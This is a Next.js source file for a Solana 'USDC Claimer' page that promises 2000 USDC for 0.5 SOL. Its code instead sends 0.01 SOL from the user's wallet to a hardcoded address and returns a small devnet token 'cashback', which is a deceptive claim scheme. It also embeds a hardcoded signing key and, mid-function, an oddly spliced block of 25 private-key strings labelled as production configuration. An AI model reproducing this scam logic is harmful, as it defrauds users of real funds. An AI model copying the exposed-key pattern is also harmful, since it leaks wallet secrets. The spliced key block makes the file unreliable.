/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5meYCvtCGzQYjBHU1xwgFsyfi2nKHK3TuFaN5zHfK1wGkZbux2u24zYXJg2vZz14cBhXTZnz7zrKoFk8yUgurEbn"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "gCg5krzNN9AWBQ7eKZ8LgT7u4BL69j6zRq4j86a29DrbCBwxzdP5tHAdAmpM9f7e4gxyb1VwywC58eCGqcN1m3R",
  "key1": "59pK3fFLKwXh4RucR6gfvkdxkg1TDoEgfUfszj82hhfB3FrCpgJsay7taJQYaTrB25D9tB8CemSHpGbBgLRTEVm7",
  "key2": "5e1Zy6HoTJwqgFPs7isE3RBxUF3c2MQFeihTGJe655Fx9vhNk9viYjHh267cVtVbRBaCGhTYpi9s5M8gBJ6Jedpv",
  "key3": "4sBccPQRzGhp4mm4aj9FpJXGV314sEgRHXokPQozmBnBmiQhzt6S9jSo1MJoqYSmmJkvGyk8z1ZTftbREshCbR6v",
  "key4": "5t2dkazKz71RETusA2HpU8yXRQi7KAB1T9oDDp2nN4ehmfcRHKipg6Ezxh7vQiZswuhV4Pk5y4j4idFWkdNJYqf6",
  "key5": "kJUma3RGuAoudBAeEts4ctKaBQL2uLnXyz9JwL6ssNnT1SbMZioeRCXHtKuuHCXwxTKdX8KaEk5b5K41FFR7VG6",
  "key6": "33TeCNLcmD46nErnGqFqDwjTA89wCWKHFSfYspVjcjdxzjLypkbJWzR7JZWTJUtbvFC7VpRGT6z3SAqNjFvLtCLh",
  "key7": "NfNwit4E4ce4bwya9bMMmMZhz5Th5RS7yVsGSbL3fKehysZRHUQUPCGqtNtB6QMSKCi695baE4tsRQmpg9E9vnP",
  "key8": "4ZDRLMbYysathzMFLTmvTfMFdHuUvsMYd4yvNy1N6L49DzxfPY7RgjkQJsfBknWhb7Cd5iYuPGH88Y93SPUwB8vM",
  "key9": "3LabyGqwNr2urTKEfTuaCVvR2H4v5VD8zdHdRSm1GDTVy8nUoeSUdEmqUBq3UQehndajiTP96PWeAB3rRpjtwpmF",
  "key10": "5TT6X3p4GUHbjz47uc6EAg9u1M6cq8Goss6ehYAdW9atXdSBsPfL4jJLZ41ngioPw5ZXhwChgWc2bLbW6XNL9iTm",
  "key11": "49HZGjgGKqraHhzAP2Dn8t9ompQB5RpzVYU46Pi8x2kGh4ywGiG32fcvk63a1gF4JWFFxzbxtRErAjtr3JsC62nn",
  "key12": "37HruKpx2gQuuB9C7sYoEC3RPyUDVEEk71ov1pQpQ6EpVQE4WamM8VRZamUiikxMY4ERkWvFCJ3pKySu6nrhzgJH",
  "key13": "2GcxNJftPA3tMNahqnTvh2yDmWMbKDgNTSGBtZrwS6CiRurY3ybhdupxK2E2WrJJtgSNQZNjdfA2CKMSZkePeSix",
  "key14": "4pFhMDojLptFomnarXh4bj9EMaGhjWJJgvfuhhKAT6FxrCQTH68mhUPBoyWqpKQwiRTEA4zUrVBsACvKRjDUkvfP",
  "key15": "3jytWDd6jLGVJe9eeK9KmCyLyPNPUu9ihYtsqAEJjXduUbBQVTfgxvhCKjQDbVukCrqgE1dhEmXDLXKb6iB5oFfx",
  "key16": "2HT5a2VZkdL1mLtNB7jBVFHTQ7vDQx8tmL9EBmgY8LMGcdUKAYvgzJwWc6R116mUs7KZWy2DKxyHzrSm1pkgtZJB",
  "key17": "3BKA4ttCb8Q6UiVQ3BYUepJZ1irSQYZfGFW3SvJfn2MuXt3eADTawAi1YQAVnCgXUenZHdDjdruiCVumnXFxZQ2G",
  "key18": "4AobswFN67JhrJPenEhJejoiTnore2b64Ms31PRenqe5nDutzihLq3UDXuWXnkG5Fh4txaqu3bjQEdiVPn1G4AKL",
  "key19": "5py1eCnWwGdfY7udXnHhuFkoYywdSTdbp1F1qQP2t7JJ47cik5na6ELfGfos8KGe5YTsnHDtPLf2eMFwAy5c4CK7",
  "key20": "m5svSYMdW2ZLUE7NywQpJvYBNE4h9XTMmBBxuE1Jh5kJQ3cJsi7M3kWYAyvC4egHixFfNu18U621y5BYLM4EGWQ",
  "key21": "4VmySwESZTMJB4nQDYQ3FCf64X24ob5SoA3eCUE1JZSS5aRomVaT8xGGNvLVXG7eJ2sGgrtKrda6UHd3mPqK9Bjt",
  "key22": "5Bbr81Tz396b6NeLHXZvUnbkrx5tih9h3Xf4MPmiBtTXpoPtb3YYJkxD5A23RtUva7ubVQpmRz2Avyd9X4z6uEaS",
  "key23": "2r2bKbEBnUPnyocqc3Lbm3x65qv87xatTN5dX7GtEqt2zvbE65HxdS4E4fq1Mw3imDiajbsARh65uBJnU5XcgWXk",
  "key24": "5JDdwLFsbaNPuW7ByVB9xXZb8YwheVBdFh5mzPwYrGMocX3s8Fue3NoPGc6drpys78f4e43NpdvxgzdUQeLQaWYX"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
